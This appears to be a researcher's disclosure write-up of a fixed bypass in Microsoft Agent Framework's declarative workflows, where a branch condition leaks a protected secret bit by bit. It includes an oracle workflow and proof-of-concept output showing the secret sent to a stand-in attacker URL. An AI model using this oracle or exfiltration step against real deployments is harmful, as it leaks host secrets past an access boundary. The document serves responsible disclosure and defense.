# Laundering a secret through an `if`: an implicit-flow bypass of Microsoft Agent Framework's protected-value boundary (GHSA-4532-fhjf-wq2q)

When a vendor ships a security fix, the fix itself is one of the best places to find the next bug. Microsoft
had just hardened a protected-value boundary in `Microsoft.Agents.AI.Workflows.Declarative` (GHSA-9f26-7mqc-9vc4,
rated High). I read what that fix actually covered, found the one path it didn't, and turned it into a working
secret-exfiltration oracle against the published package — without a network, using a fabricated secret.

Here is the whole thing, start to finish.

## The boundary, and what it's supposed to guarantee

The declarative workflow engine lets a host expose configuration to a workflow through an `Env` scope. Secrets
placed there are tagged `SensitivityLevel.Sensitive`, and the guarantee is simple: a `Sensitive` value must
never leave the workflow through a sink. Every data sink enforces it — `SendActivity`, `HttpRequestAction`,
`InvokeMcpTool`, `InvokeFunctionTool`, `InvokeAzureAgent`, `Question`, `AddConversationMessage` — each refuses
to emit a `Sensitive` value, and variable assignments propagate the tag so you can't launder it through a
`SetVariable`. That's the control GHSA-9f26 added and hardened in 1.24.0.

The threat model is a less-trusted **workflow author**: the host runs a declarative workflow definition written
by someone who shouldn't see the host's secrets, and the sensitivity boundary is what keeps those secrets in.

## Reading the fix for what it missed

The GHSA-9f26 fix added guards to the sinks and to value assignments. So I asked the obvious question: is there
anywhere the engine evaluates an author-controlled expression over a protected value **without** consulting
sensitivity?

There was exactly one: `ConditionGroupExecutor`. It evaluated a branch condition and acted on the result with
no sensitivity check and no taint propagation into whatever the branch assigned:

```csharp
EvaluationResult<bool> expressionResult = this.Evaluator.GetValue(conditionItem.Condition);
if (expressionResult.Value)
```

Every *data-flow* path was guarded. The *control-flow* path was not. And control flow is enough to leak a
secret — this is textbook implicit information flow.

## Turning it into an oracle

If I can branch on a predicate over the secret, I get one bit per run. Consider:

```
ConditionGroup:
  condition: =StartsWith(Env.API_SECRET, "sk_live")
  actions:   SetVariable Local.Leak = "prefix_is_sk_live"
elseActions: SetVariable Local.Leak = "prefix_other"
SendActivity: "OUT={Local.Leak}"
```

The secret selected the branch, but `Local.Leak` only ever held a **literal** — tagged `None` — so the sink
happily emitted it. One carefully chosen predicate per character (does it start with `sk_live_A`? `sk_live_B`?
…) walks the whole secret out, character by character. A single workflow then reassembles it and forwards it in
one `HttpRequestAction` to an attacker URL.

## Proving it on the shipped package

I don't report theories; I report the shipped engine returning the wrong answer. I built the PoC against the
**published NuGet 1.24.0** — the very release that fixed GHSA-9f26 — with no network and a fabricated secret
(`sk_live_SECRETBIT`), and ran three scenarios so the result couldn't be hand-waved:

```
[A direct]           expect=BLOCK -> BLOCKED   (boundary held)
[B derived]          expect=BLOCK -> BLOCKED   (boundary held)
[C condition-oracle] expect=BLOCK -> EMITTED   OUT=prefix_is_sk_live   >>> BOUNDARY BYPASSED
[chain]  attacker sink received URL: https://attacker.example/collect?d=sk_live_SECRETBIT
[D extraction] recovered secret = "sk_live_SECRETBIT"  match=True
```

A and B prove the boundary is genuinely active for data flow. C is the bypass. The chain and extraction prove
it isn't a curiosity — the full secret comes out and leaves over a real sink.

## The fix is to make control flow obey the same rule as data flow

`ConditionGroupExecutor` was the one place that evaluated an author expression but skipped the sensitivity
boundary the rest of the engine enforced. The right fix reuses the exact mechanism GHSA-9f26 already added
rather than inventing a new one: route the condition through `GetNonSensitiveValue`, exactly as the MCP,
function, and HTTP executors do for their inputs, and apply the same check on the generated (ahead-of-time)
condition path so interpreted and generated workflows fail closed identically.

I also swept the other control-flow constructs that evaluate an author expression —
`QuestionExecutor`, `RetrieveConversationMessagesExecutor`, `ForeachExecutor` — and reported them as same-root-cause
siblings. The upstream fix (PR #9357, `fix(dotnet): validate declarative control-flow inputs`) closed all of
them in one change, and shipped in 1.26.0.

## Takeaway

Two habits did all the work here. First: **audit the fix, not just the code** — a freshly hardened boundary
tells you exactly what the author was worried about, and the sibling path they forgot is usually right next to
it. Second: when a boundary blocks *data* flow, check whether it also blocks *control* flow. A value you're not
allowed to emit, you're often still allowed to **branch on** — and one bit per branch is all an oracle needs.

---

*GHSA-4532-fhjf-wq2q. Reported to Microsoft (MSRC Case 159229); fixed in `Microsoft.Agents.AI.Workflows.Declarative`
1.26.0. Credit accepted 2026-10-26. Mitigation-bypass sibling of GHSA-9f26-7mqc-9vc4.*
